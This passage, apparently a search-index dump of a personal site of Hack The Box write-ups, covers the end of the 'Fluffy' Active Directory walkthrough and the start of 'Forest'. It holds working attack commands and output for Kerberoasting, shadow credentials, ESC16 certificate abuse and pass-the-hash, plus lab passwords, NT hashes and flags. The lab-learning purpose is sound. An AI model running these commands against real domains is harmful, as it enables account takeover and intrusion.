1fe29e6e054e35f0e9ae6906ac5523191ccd3cf8ec91a11c7d34841977604eb9a7b36cd7fd49e5fdc8857f2b099fc87d3e734d2db25f8961bbd06154ca32dd8e4b91773b823bd19c964850f79c8c6818031d130883ee43dcb92b385970b482a9e5c81b1f8cfc82a71a6b054cbd8f28a2bc7059f593dffb97a5bed21beba857213a3479269a066fa6b117a428118305fc6d5c44dd9054483bf68c494d7b9a6544983a80d3b925a055feb63c9a804c9631eef0\n$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$55e2bb000898ea80138be5e88c4e1e4f$5099f0030807c7c4f3444c8caeab7de469fa97c7a857125a6c0f506d2ccabac9da60271f46834a769e84b5605b5d5127ac72efe61e7611758898ab9226588ca9010e40e8485d22076f98a01052c1734a56c09126407c3ed8cdd35d1701665838ffe24fbfed09a4dc840659294c5970b6f7484254d07ad23a71385a3abf2af69eedc9f60826051cbcb5acd43aab96c7d55ad75dd310cac8a9c6ba94fa6e65dafb6bc1461ca688553f58ddd234c2cc0578419f4630798051b303712065b154af3770a3afc4388c00865a63b11a2f5463c11e1252ea7cc504c50d2940c24665f5adf9e7920341295762c98b57c50c5ddbd2bdd1b35a86b31e03b787fcde9f6e854d7880e2bfb53c71ab3af2055fd1311a5fdcdeb673066bfd7c641e559af6636f078909020aec5b71cdf6676c5e9f9beeb9ba4dda8c21426ea2288103d0228f72ffceeeea5317e715fe0646cadf82b337d95cb61e3590a91535d9ddfb9126203c797406bcbf9a8250c6ad2995b980cde4d3255b766cd23a9873bbc8267ad2ade206b8087aa86add94638c6a4cc85341106c818034e79007fa13e766652eeb15263117c5b4e3bb708632ac416550fa4c1f470d0484a7157fd39bd021e70445a163305a7031ab3636d100fa1e776e280980111940e9b6e69fccdf4a815ec30e76e5155569e31af8ad041f065365fdc46b3b0f8ac162f7dac20ab6eddf235765de93102e58951abf94fa0691800d9396dc31047159c4f688469d7ece16165b3332920461897d3fa4fafc5cac2332fe1323154398c3cc1ddc08025531e0cd5b80b95d5b9e46256fd60cabc9f1be360c590a76324fb1ff52217c162af004c1c1bdd0b24f8ff7f855f7c23628b9b6606ed2a25045fe2980ac533c6eae7d47be985a49603c82c2c297e1aa5e1660662c018b9e08f8279d18139ccea101137bb36c0f4a456da78d3a7c3ed52c478f92adff3ea6c3b7c645f4dec16382b3748688c430b4186946e2291d60407e402e97f276d0665a7bc9fe424afb6c2d51cadab102a00922eb232d6021463cc6d926fb9fed46229cb947dabcd3168b0eeaf20214dec207c1ce1d8aa1664b013fe6108240e3bb6beca7681fb77118f1858ce3d1cfdb72ee9f2d082c7d6907c9309bfa681f0776dceb2559461f301c8543104fbd7c193a3d81809533b01bf84986cf29a7a11e477836c148df7d68d35211064aea88d4cc1cafbd85792aad9298dfd0aa7234337949156b2d6f37b19fa3b0b399a313cd4593cf7e8a53f6cc46cb576526a3125ea7cdc93b6cae39e5d5e49f0861b51ac411e85b1c68d5bfbf7065bba78c58b98f13f26176cfffa777dddace5a65ceeee798ee57c5f4c719a478e65eef199b408838f9b23b04a32a7b102e35a0998d1ccfa445499c6c0a440050f67f74e0dc846aad11232680760177a43e3a3935d90e7d039f9524f4b9c0c08869bddd8d013decc98253ba4e0872fa6e71c4d7200fd18cb11a9b358da2\n</code></pre> we got a hashes related to service tickets (TGS), one for <code>ca_svc</code> and one for <code>winrm_svc</code></p>"},{"location":"ch3ckm8_HTB_fluffy/#attempting-to-crack-hashes","title":"Attempting to crack hashes","text":"<p>Unfortunately when running hashcat like this:  <pre><code>hashcat -m 13100 hash.txt rockyou.txt --force\n</code></pre> the hashes appeared to be uncrackable! This means either the password is too complex, or we are using wrong cracking configuration. We must find another way....</p>"},{"location":"ch3ckm8_HTB_fluffy/#bloodhound-as-pagila","title":"Bloodhound as p.agila","text":"<p>We can also use bloodhound to see the bigger picture: <pre><code>bloodhound-python -u 'p.agila' -p 'prometheusx-303'  -d fluffy.htb -ns 10.10.11.69 -c All --zip\n</code></pre></p> <p>First, found the group membership of p.agila </p> <p>lets inspect the service account managers: (outbound object control) </p> <p>lets now inspect service accounts: (outbound object control)  this group has  <code>GenericWrite</code> permissions over those service accounts</p> <p>lets also see Group membership for each one of those service accounts - ldap_svc  - winrm_svc  - ca_svc  hm, we see cert publishers here.. seems interesting</p> <p>So this will be our path, targeting cert_publishers</p>"},{"location":"ch3ckm8_HTB_fluffy/#add-user-to-group","title":"Add user to group","text":"<p>First\u00a0<code>p.agila</code>add it to the SERVICE ACCOUNTS group <pre><code>bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila\n</code></pre> output <pre><code>[+] p.agila added to SERVICE ACCOUNTS\n</code></pre> okay we added the user to SERVICE ACCOUNTS, but whats next?</p> <p>Lets remember the outbound object control of SERVICE ACCOUNTS:  it has <code>GenericWrite</code> over those 3 users, what can we do with it?</p> <p>This one helped me choose what to do next: https://www.thehacker.recipes/ad/movement/dacl/</p>"},{"location":"ch3ckm8_HTB_fluffy/#how-to-take-advantage-of-genericwrite","title":"How to take advantage of GenericWrite ?","text":"<p>GenericWrite privilege can do the following : - Allows modification a multitude of target object's attributes. For example certificate/key related attributes such as <code>msDS-KeyCredentialLink</code>. - Adding entries to <code>msDS-KeyCredentialLink</code> is precisely how shadow credentials are stored in AD (public-key blobs / KeyCredential objects). - Therefore an identity with GenericWrite can add a KeyCredential (public key) to a service account object, enabling a holder of the private key to authenticate as that service account  Put another way: GenericWrite \u2192 ability to change key/certificate attributes \u2192 ability to add KeyCredential entries \u2192 attacker can authenticate with a private key as the target account = shadow cred capability.</p>"},{"location":"ch3ckm8_HTB_fluffy/#what-are-shadow-credentials","title":"What are shadow credentials ?","text":"<p>Shadow credentials are certificate-based credentials that get attached to an Active Directory account so that the holder of the corresponding private key can authenticate as that account \u2014 without ever knowing the account\u2019s password.</p> <p>Technically they show up in AD as entries under attributes like <code>msDS-KeyCredentialLink</code> / KeyCredential objects (a \u201ckey credential\u201d / public key blob tied to the object). Windows accepts those key entries for certain auth flows (e.g. certificate-based authentication / certificate logon, WinRM / Negotiate if configured, ADFS/OAuth flows in some deployments), so if you can add such a key to an account, you can impersonate it using the private key \u2014 password not required.</p>"},{"location":"ch3ckm8_HTB_fluffy/#adding-shadow-credential","title":"Adding Shadow Credential","text":""},{"location":"ch3ckm8_HTB_fluffy/#towards-winrm_svc","title":"Towards WINRM_SVC","text":"<p>lets sync with the machine's dc <pre><code>ntpdate fluffy.htn\n</code></pre> then <pre><code>certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'\n</code></pre> output: <pre><code>\u2514\u2500# certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'winrm_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID '688de985-f73a-14b9-884e-33a1d3158056'\n[*] Adding Key Credential with device ID '688de985-f73a-14b9-884e-33a1d3158056' to the Key Credentials for 'winrm_svc'\n[*] Successfully added Key Credential with device ID '688de985-f73a-14b9-884e-33a1d3158056' to the Key Credentials for 'winrm_svc'\n[*] Authenticating as 'winrm_svc' with the certificate\n[*] Using principal: winrm_svc@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'winrm_svc.ccache'\n[*] Trying to retrieve NT hash for 'winrm_svc'\n[*] Restoring the old Key Credentials for 'winrm_svc'\n[*] Successfully restored the old Key Credentials for 'winrm_svc'\n[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767\n</code></pre> great! now lets login to <code>winrm_svc</code> with this hash <code>33bd09dcd697600edf6b3a7af4875767</code> <pre><code>evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'\n</code></pre> and grab the user flag! <pre><code>84f38474ff40ababe763e4ec474cd157\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#towards-ca_svc","title":"Towards CA_SVC","text":"<p>Similarly, since we have <code>GenericWrite</code> towards ca_svc too, lets get NT hash for <code>ca_svc</code> too, and we will see later how it will be used: <pre><code>certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc\n</code></pre> (the output here is similar to winrm_svc, its snipped) <pre><code>[*] Successfully restored the old Key Credentials for 'ca_svc'\n[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#privesc","title":"Privesc","text":"<p>Since <code>ca_svc</code> user exists, this signals the presence of certificate authority, so lets find out more about it by identifying vulnerable certificates first:</p>"},{"location":"ch3ckm8_HTB_fluffy/#searching-for-vulnerable-certificates","title":"Searching for vulnerable certificates","text":"<p>By using certipy i am going to search whether there are vulnerable certs present <pre><code>certipy-ad find -vulnerable -u CA_SVC -hashes \":ca0f4f9e9eb8a092addf53bb03fc98c8\" -dc-ip 10.10.11.69\n</code></pre> found no templates, but lets update certipy to latest version and try again <pre><code>certipy-ad find -vulnerable -u CA_SVC -hashes \":ca0f4f9e9eb8a092addf53bb03fc98c8\" -dc-ip 10.10.11.69\n</code></pre> output: <pre><code>Certipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 14 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP\n[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'\n[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Saving text output to '20250529120822_Certipy.txt'\n[*] Wrote text output to '20250529120822_Certipy.txt'\n[*] Saving JSON output to '20250529120822_Certipy.json'\n[*] Wrote JSON output to '20250529120822_Certipy.json'\n\ncat 20250529120822_Certipy.txt \nCertificate Authorities\n  0\n    CA Name                             : fluffy-DC01-CA\n    DNS Name                            : DC01.fluffy.htb\n    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb\n    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5\n    Certificate Validity Start          : 2025-04-17 16:00:16+00:00\n    Certificate Validity End            : 3024-04-17 16:11:16+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2\n    Permissions\n      Owner                             : FLUFFY.HTB\\Administrators\n      Access Rights\n        ManageCa                        : FLUFFY.HTB\\Domain Admins\n                                          FLUFFY.HTB\\Enterprise Admins\n                                          FLUFFY.HTB\\Administrators\n        ManageCertificates              : FLUFFY.HTB\\Domain Admins\n                                          FLUFFY.HTB\\Enterprise Admins\n                                          FLUFFY.HTB\\Administrators\n        Enroll                          : FLUFFY.HTB\\Cert Publishers\n    [!] Vulnerabilities\n      ESC16                             : Security Extension is disabled.\n    [*] Remarks\n      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.\nCertificate Templates                   : [!] Could not find any certificate templates\n</code></pre> There is\u00a0<code>ESC16</code> vulnerability! </p>"},{"location":"ch3ckm8_HTB_fluffy/#exploiting-esc16","title":"Exploiting ESC16","text":""},{"location":"ch3ckm8_HTB_fluffy/#1-read-the-original-upn-of-the-victim-account-optional-for-recovery","title":"1 : Read the original UPN of the victim account (optional - for recovery).","text":"<p><pre><code>certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read\n</code></pre> output <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Reading attributes for 'ca_svc':\n    cn                                  : certificate authority service\n    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb\n    name                                : certificate authority service\n    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103\n    sAMAccountName                      : ca_svc\n    servicePrincipalName                : ADCS/ca.fluffy.htb\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#2-update-the-victim-accounts-upn-to-that-of-the-target-administrator-samaccountname","title":"2: Update the victim account\u2019s UPN to that of the target administrator\u00a0<code>sAMAccountName</code>.","text":"<p><pre><code>certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update\n</code></pre> output <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : administrator\n[*] Successfully updated 'ca_svc'\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#3-request-a-certificate-issued-as-the-victim-user-from-any-appropriate-client-authentication-template-eg-user-on-the-ca-vulnerable-to-esc16","title":"3: Request a certificate issued as the \"victim\" user from any appropriate client authentication template* (e.g., \"user\") on the CA vulnerable to ESC16","text":"<p><pre><code>certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto\n</code></pre> output: <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Targeting user 'ca_svc'\n[*] Generating certificate\n[*] Certificate generated\n[*] Generating Key Credential\n[*] Key Credential generated with DeviceID 'd6fa2c18-58bb-8509-b2f8-6eca381c72c2'\n[*] Adding Key Credential with device ID 'd6fa2c18-58bb-8509-b2f8-6eca381c72c2' to the Key Credentials for 'ca_svc'\n[*] Successfully added Key Credential with device ID 'd6fa2c18-58bb-8509-b2f8-6eca381c72c2' to the Key Credentials for 'ca_svc'\n[*] Authenticating as 'ca_svc' with the certificate\n[*] Using principal: ca_svc@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'ca_svc.ccache'\n[*] Trying to retrieve NT hash for 'ca_svc'\n[*] Restoring the old Key Credentials for 'ca_svc'\n[*] Successfully restored the old Key Credentials for 'ca_svc'\n[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8\n</code></pre> According to this snippet of the above output: <pre><code>[*] Saved credential cache to 'ca_svc.ccache'\n</code></pre> we should tell kerberos to use this credential <code>ca_svc.ccache</code>: <pre><code>export KRB5CCNAME=ca_svc.ccache \n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#4-request-a-certificate","title":"**4. Request a certificate","text":"<p><pre><code>certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'\n</code></pre> output: <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 16\n[*] Got certificate with UPN 'administrator'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'         \n</code></pre> (keep in mind sometimes you need to rerun the commands or even sync with the domain again, there can be network errors)</p>"},{"location":"ch3ckm8_HTB_fluffy/#5-restore-the-upn-of-the-victim-account","title":"5 : Restore the UPN of the \"victim\" account.","text":"<p><pre><code>certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update\n</code></pre> output <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Updating user 'ca_svc':\n    userPrincipalName                   : ca_svc@fluffy.htb\n[*] Successfully updated 'ca_svc'\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#6-authenticate-as-the-target-administrator","title":"6 : Authenticate as the target administrator.","text":"<p><pre><code>certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'\n</code></pre> output <pre><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@fluffy.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\n</code></pre> we got hash! <pre><code>aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e\n</code></pre> grab the 2nd part and login with winrm <pre><code>evil-winrm -i fluffy.htb -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'\n</code></pre> got the root flag! <pre><code>ca48648c7b02dd108e61dda67896f5b7\n</code></pre></p>"},{"location":"ch3ckm8_HTB_fluffy/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_fluffy/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>Add host to <code>/etc/hosts</code> and run <code>nmap -sV -Pn</code> \u2192 AD ports (DNS, Kerberos, LDAP, SMB, WinRM) and host identified as <code>DC01</code>.</li> <li>Correlated provided creds against services (SMB/LDAP) \u2014 <code>j.fleischman</code> works for SMB; </li> <li>Enumerated SMB shares.</li> <li>Inspected <code>IT</code> share \u2192 download <code>Upgrade_Notice.pdf</code>, <code>Everything</code>, <code>KeePass</code> archive; <code>Upgrade_Notice.pdf</code> flags CVE-2025-24071 (<code>.library-ms</code> ZIP \u2192 SMB auth leak).</li> <li>Decide exploit vector: target CVE-2025-24071 via crafted ZIP upload to <code>IT</code> to trigger NTLM auth capture.</li> </ol>"},{"location":"ch3ckm8_HTB_fluffy/#foothold_1","title":"Foothold","text":"<ol> <li>Create PoC <code>exploit.zip</code> for CVE-2025-24071 and upload to <code>//fluffy.htb/IT</code> via <code>smbclient</code>.</li> <li>Run <code>responder</code> locally to capture incoming NTLM auths; capture NTLMv2 from <code>p.agila</code>.</li> <li>Crack captured NTLMv2 with <code>john</code> \u2192 <code>p.agila:prometheusx-303</code>.</li> <li>Validate <code>p.agila</code> credentials against SMB/LDAP and continue enumeration from that account.</li> <li>Enumerate domain users/groups via <code>crackmapexec</code>/LDAP \u2014 find <code>ca_svc</code>, <code>ldap_svc</code>, <code>winrm_svc</code>, <code>Cert Publishers</code>, <code>Service Accounts</code>, etc.</li> <li>Dump SPNs with <code>GetUserSPNs.py</code> \u2192 collect TGS hashes for <code>ca_svc</code>, <code>ldap_svc</code>, <code>winrm_svc</code>; </li> <li>Hashcracking attempts failed, had to find another way</li> <li>Run BloodHound as <code>p.agila</code> \u2192 discovered outbound <code>GenericWrite</code>/owner-style control from service-account-managing groups over <code>ca_svc</code> and other service accounts; <code>ca_svc</code> is in <code>Cert Publishers</code> (ADCS path identified).</li> </ol>"},{"location":"ch3ckm8_HTB_fluffy/#privesc_1","title":"Privesc","text":"<ol> <li>Use <code>GenericWrite</code>/owner control findings to modify/abuse <code>ca_svc</code> (or set owner) so the service account can be used for cert enrollment or shadow creds.</li> <li>Enumerate ADCS templates and request a cert using the service account context (certipy-like workflow) against a vulnerable template that permits high-privilege UPN enrollment.</li> <li>Extract auth from the returned certificate (<code>.pfx</code>) or retrieve shadow credentials / NT hash for <code>ca_svc</code></li> <li>Use the cert/hash to authenticate as a privileged account (Administrator) via certificate or hash-based login (e.g., <code>evil-winrm -u administrator -H &lt;hash&gt;</code> or cert auth).</li> </ol>"},{"location":"ch3ckm8_HTB_fluffy/#sidenotes","title":"Sidenotes","text":"<p>This one was a classic yet challenging easy AD related box that did not dissaspoint. The techniques showed here are definitely worth revisiting in the future, especially for machines related to certificates. </p> <p>https://www.hackthebox.com/achievement/machine/284567/662 </p>"},{"location":"ch3ckm8_HTB_forest/","title":"Forest","text":""},{"location":"ch3ckm8_HTB_forest/#intro","title":"Intro","text":"<p>[[windows]]  [[NotAssumedBreach]]  [[AS-REP-roasting]] [[OSCPpath]] Tags: #windows  #NotAssumedBreach  #AS-REP-roasting #OSCPpath Tools used: enum4linux (smb &amp; rpc enum) ldapsearch (ldap enum) windapsearch (ldap enum) impacket (AS-REP roasting &amp; secretsdump) john (password cracking) PowerView (DACL abuse)</p>"},{"location":"ch3ckm8_HTB_forest/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_forest/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.95.210 forest.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_forest/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV forest.htb\n</code></pre> <p><pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-07-27 01:24 CDT\nNmap scan report for forest.htb (10.129.95.210)\nHost is up (0.078s latency).\nNot shown: 989 closed tcp ports (reset)\nPORT     STATE SERVICE      VERSION\n53/tcp   open  domain       Simple DNS Plus\n88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-27 06:31:51Z)\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-27T06:31:57\n|_  start_date: 2025-07-27T06:29:38\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\\\\\\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2025-07-26T23:32:01-07:00\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 27.08 seconds\n</code></pre> According to the open ports, this host appears to be the DC, since we know nothing more and its not an assumed breach scenario, we should take into account the open ports in order to enumerate extensively.</p>"},{"location":"ch3ckm8_HTB_forest/#smb-enumeration","title":"SMB enumeration","text":""},{"location":"ch3ckm8_HTB_forest/#smb-anonymous-logon","title":"SMB anonymous logon","text":"<p><pre><code>smbclient -N -L forest.htb\n</code></pre> it was succesfull, but no shares shown, and since we have no valid creds we cant move forward with this.</p>"},{"location":"ch3ckm8_HTB_forest/#rpc-enumeration","title":"RPC enumeration","text":""},{"location":"ch3ckm8_HTB_forest/#rcp-anonymous-login","title":"RCP anonymous login","text":"<pre><code>rpcclient -U \"\" -N forest.htb\n</code></pre> <p><pre><code>rpcclient $&gt; enumdomains\nname:[HTB] idx:[0x0]\nname:[Builtin] idx:[0x0]\n\nrpcclient $&gt; enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[DefaultAccount] rid:[0x1f7]\nuser:[$331000-VK4ADACQNUCA] rid:[0x463]\nuser:[SM_2c8eef0a09b545acb] rid:[0x464]\nuser:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]\nuser:[SM_75a538d3025e4db9a] rid:[0x466]\nuser:[SM_681f53d4942840e18] rid:[0x467]\nuser:[SM_1b41c9286325456bb] rid:[0x468]\nuser:[SM_9b69f1b9d2cc45549] rid:[0x469]\nuser:[SM_7c96b981967141ebb] rid:[0x46a]\nuser:[SM_c75ee099d0a64c91b] rid:[0x46b]\nuser:[SM_1ffab36a2f5f479cb] rid:[0x46c]\nuser:[HealthMailboxc3d7722] rid:[0x46e]\nuser:[HealthMailboxfc9daad] rid:[0x46f]\nuser:[HealthMailboxc0a90c9] rid:[0x470]\nuser:[HealthMailbox670628e] rid:[0x471]\nuser:[HealthMailbox968e74d] rid:[0x472]\nuser:[HealthMailbox6ded678] rid:[0x473]\nuser:[HealthMailbox83d6781] rid:[0x474]\nuser:[HealthMailboxfd87238] rid:[0x475]\nuser:[HealthMailboxb01ac64] rid:[0x476]\nuser:[HealthMailbox7108a4e] rid:[0x477]\nuser:[HealthMailbox0659cc1] rid:[0x478]\nuser:[sebastien] rid:[0x479]\nuser:[lucinda] rid:[0x47a]\nuser:[svc-alfresco] rid:[0x47b]\nuser:[andy] rid:[0x47e]\nuser:[mark] rid:[0x47f]\nuser:[santi] rid:[0x480]\n\nrpcclient $&gt; enumdomgroups\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Domain Controllers] rid:[0x204]\ngroup:[Schema Admins] rid:[0x206]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Read-only Domain Controllers] rid:[0x209]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[Enterprise Key Admins] rid:[0x20f]\ngroup:[DnsUpdateProxy] rid:[0x44e]\ngroup:[Organization Management] rid:[0x450]\ngroup:[Recipient Management] rid:[0x451]\ngroup:[View-Only Organization Management] rid:[0x452]\ngroup:[Public Folder Management] rid:[0x453]\ngroup:[UM Management] rid:[0x454]\ngroup:[Help Desk] rid:[0x455]\ngroup:[Records Management] rid:[0x456]\ngroup:[Discovery Management] rid:[0x457]\ngroup:[Server Management] rid:[0x458]\ngroup:[Delegated Setup] rid:[0x459]\ngroup:[Hygiene Management] rid:[0x45a]\ngroup:[Compliance Management] rid:[0x45b]\ngroup:[Security Reader] rid:[0x45c]\ngroup:[Security Administrator] rid:[0x45d]\ngroup:[Exchange Servers] rid:[0x45e]\ngroup:[Exchange Trusted Subsystem] rid:[0x45f]\ngroup:[Managed Availability Servers] rid:[0x460]\ngroup:[Exchange Windows Permissions] rid:[0x461]\ngroup:[ExchangeLegacyInterop] rid:[0x462]\ngroup:[$D31000-NSEL5BRJ63V7] rid:[0x46d]\ngroup:[Service Accounts] rid:[0x47c]\ngroup:[Privileged IT Accounts] rid:[0x47d]\ngroup:[test] rid:[0x13ed]\n</code></pre> (we cant run rpcdump, we dont have valid user creds)</p>"},{"location":"ch3ckm8_HTB_forest/#smb-rpc-enumeration-automatically","title":"SMB &amp; RPC enumeration automatically","text":"<p>instead of manually enumerating smb and rpc, we can get more info at once via a tools such as enum4linux (this tool cant enumerate ldap though) <pre><code>enum4linux -A forest.htb\n</code></pre></p> <p><pre><code>ENUM4LINUX - next generation (v1.3.4)\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... forest.htb\n[*] Username ......... ''\n[*] Random Username .. 'osubnozz'\n[*] Password ......... ''\n[*] Timeout .......... 5 second(s)\n\n ===================================\n|    Listener Scan on forest.htb    |\n ===================================\n[*] Checking LDAP\n[+] LDAP is accessible on 389/tcp\n[*] Checking LDAPS\n[+] LDAPS is accessible on 636/tcp\n[*] Checking SMB\n[+] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS\n[+] SMB over NetBIOS is accessible on 139/tcp\n\n ==================================================\n|    Domain Information via LDAP for forest.htb    |\n ==================================================\n[*] Trying LDAP\n[+] Appears to be root/parent DC\n[+] Long domain name is: htb.local\n\n =========================================================\n|    NetBIOS Names and Workgroup/Domain for forest.htb    |\n =========================================================\n[-] Could not get NetBIOS names information via 'nmblookup': timed out\n\n =======================================\n|    SMB Dialect Check on forest.htb    |\n =======================================\n[*] Trying on 445/tcp\n[+] Supported dialects and settings:\nSupported dialects:\n  SMB 1.0: true\n  SMB 2.02: true\n  SMB 2.1: true\n  SMB 3.0: true\n  SMB 3.1.1: true\nPreferred dialect: SMB 3.0\nSMB1 only: false\nSMB signing required: true\n\n =========================================================\n|    Domain Information via SMB session for forest.htb    |\n =========================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: FOREST\nNetBIOS domain name: HTB\nDNS domain: htb.local\nFQDN: FOREST.htb.local\nDerived membership: domain member\nDerived domain: HTB\n\n =======================================\n|    RPC Session Check on forest.htb    |\n =======================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user\n[-] Could not establish random user session: STATUS_LOGON_FAILURE\n\n =================================================\n|    Domain Information via RPC for forest.htb    |\n =================================================\n[+] Domain: HTB\n[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565\n[+] Membership: domain member\n\n =============================================\n|    OS Information via RPC for forest.htb    |\n =============================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found OS 